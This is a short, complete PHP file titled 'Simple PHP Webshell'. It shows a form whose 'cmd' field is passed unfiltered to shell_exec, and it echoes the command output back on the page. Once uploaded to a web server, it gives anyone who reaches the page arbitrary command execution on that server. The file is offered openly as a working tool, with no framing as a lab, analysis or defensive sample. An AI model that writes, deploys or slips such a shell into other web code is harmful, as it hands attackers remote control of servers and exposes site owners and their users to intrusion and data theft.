<!DOCTYPE html>
<html>
<head>
    <title>Simple PHP Webshell</title>
</head>

    <body>

        <form action="shell.php" method="post">
            Command: <input type="text" name="cmd">
            <input type="submit" value="Submit">
        </form>

        <br>

        <?php $output = shell_exec($_POST["cmd"]); ?>
            <font size="5" face="Consolas" >
            <table align="center" width="800" border="1">
                <tr>
                    <td><?php echo "<pre>$output</pre>"; ?></td>
                </tr>
            </table>

    </body>
</html>
